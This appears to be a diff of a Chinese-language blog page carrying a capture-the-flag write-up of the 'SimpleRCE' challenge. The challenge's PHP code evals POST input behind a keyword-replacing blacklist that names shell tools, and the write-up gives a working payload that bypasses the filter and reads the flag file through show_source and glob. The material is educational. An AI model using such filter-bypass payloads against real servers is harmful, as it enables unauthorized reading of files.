@@ -2249,6 +2249,145 @@
           <li class="md-meta__item">
             分类于
             
+              <a href="../../../../category/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" class="md-meta__link">代码执行</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 1 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="dest0g3-520-simplerce-hacker"><a class="toclink" href="../../../../dest0g3-simplerce/">[Dest0g3 520迎新赛] SimpleRCE —— 关键词被替换成 hacker 之后</a></h2>
+<h3 id="_1"><a class="toclink" href="../../../../dest0g3-simplerce/#_1">源码</a></h3>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="x">$aaa = $_POST['aaa'];</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="x">$black_list = array('^','.','`','&gt;','&lt;','=','"','preg','&amp;','|','%0','popen',</span>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="x">'char','decode','html','md5','{','}','post','get','file','ascii','eval',</span>
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="x">'replace','assert','exec','$','include','var','pastre','print','tail','sed',</span>
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="x">'pcre','flag','scan','decode','system','func','diff','ini_','passthru',</span>
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="x">'pcntl','proc_open','+','cat','tac','more','sort','log','current','\\',</span>
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="x">'cut','bash','nl','wget','vi','grep');</span>
+</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a><span class="x">$aaa = str_ireplace($black_list, "hacker", $aaa);</span>
+</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a><span class="x">eval($aaa);</span>
+</span></code></pre></div>
+<h3 id="_2"><a class="toclink" href="../../../../dest0g3-simplerce/#_2">两个关键判断</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>① eval()          → 执行的是 PHP 代码,不是 shell 命令
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>② str_ireplace()  → 命中就【替换成 hacker】,不是拦截
+</span></code></pre></div>
+<p><strong>所以 <code>;ls /</code> 死路一条 —— <code>ls /</code> 不是合法 PHP。</strong></p>
+<h3 id="_3"><a class="toclink" href="../../../../dest0g3-simplerce/#_3">被封的东西</a></h3>
+<table>
+<thead>
+<tr>
+<th>被封</th>
+<th>后果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>$</code></td>
+<td>不能用变量</td>
+</tr>
+<tr>
+<td><code>.</code></td>
+<td>不能字符串拼接</td>
+</tr>
+<tr>
+<td><code>flag</code></td>
+<td>变成 <code>hacker</code></td>
+</tr>
+<tr>
+<td><code>system</code> / <code>eval</code> / <code>assert</code> / <code>include</code></td>
+<td>常用执行函数全灭</td>
+</tr>
+<tr>
+<td><code>file</code> <code>scan</code> <code>glob</code>…</td>
+<td>部分读文件函数被连坐</td>
+</tr>
+</tbody>
+</table>
+<h3 id="_4"><a class="toclink" href="../../../../dest0g3-simplerce/#_4">过程</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>① echo(12);                → 页面出 12,确认 eval 通
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>② echo(join(glob('/*')));  → 列出根目录,发现 flag
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>③ 但 flag 会被替换,不能写 '/flag'
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>④ 用位置:array_slice(glob('/*'),4,1) → ['/flag']
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>⑤ join 成字符串 → show_source 读出来
+</span></code></pre></div>
+<p><strong>最终 payload：</strong></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="x">show_source(join(array_slice(glob('/*'),4,1)));</span>
+</span></code></pre></div>
+<h3 id="_5"><a class="toclink" href="../../../../dest0g3-simplerce/#_5">每一步在绕什么</a></h3>
+<table>
+<thead>
+<tr>
+<th>步骤</th>
+<th>绕的是</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>glob('/*')</code></td>
+<td>不知道文件名</td>
+</tr>
+<tr>
+<td><code>array_slice(...,4,1)</code></td>
+<td><code>flag</code> 这个词不能出现</td>
+</tr>
+<tr>
+<td><code>join(...)</code></td>
+<td><code>.</code> 被禁，不能拼接</td>
+</tr>
+<tr>
+<td><code>show_source(...)</code></td>
+<td><code>file_get_contents</code> 含 <code>file</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="_6"><a class="toclink" href="../../../../dest0g3-simplerce/#_6">踩的坑</a></h3>
+<div class="admonition bug">
+<p class="admonition-title">echo(12) 没反应</p>
+<p><strong>eval 里语句必须带 <code>;</code>。</strong>
+普通 PHP 文件里 <code>?&gt;</code> 能代替分号，eval 没有 <code>?&gt;</code>。</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>Parse error: syntax error, unexpected end of file, expecting ';'
+</span></code></pre></div>
+</div>
+<div class="admonition bug">
+<p class="admonition-title">echo(glob('/*')) 只输出 Array</p>
+<p>echo 不能输出数组，要先 <code>join()</code>。</p>
+</div>
+<div class="admonition bug">
+<p class="admonition-title">show_source('/f*') 失败</p>
+<p>show_source 不做通配符展开 —— 它去找一个名字字面量叫 <code>f*</code> 的文件。</p>
+</div>
+<h3 id="_7"><a class="toclink" href="../../../../dest0g3-simplerce/#_7">收获</a></h3>
+<blockquote>
+<p><strong>关键词被替换 ≠ 无解 —— 用「运行时拼接」把词造出来。</strong></p>
+<p><strong>名字被过滤 ≠ 无解 —— 用「位置」代替「名字」。</strong></p>
+<p><strong>先分清 eval 还是 system，否则整个方向都是错的。</strong></p>
+</blockquote>
+    
+    
+  </div>
+</article>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
+          <time datetime="2026-10-21 00:00:00+00:00">2026-10-21</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
               <a href="../../../../category/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" class="md-meta__link">命令注入</a></li>
         
         
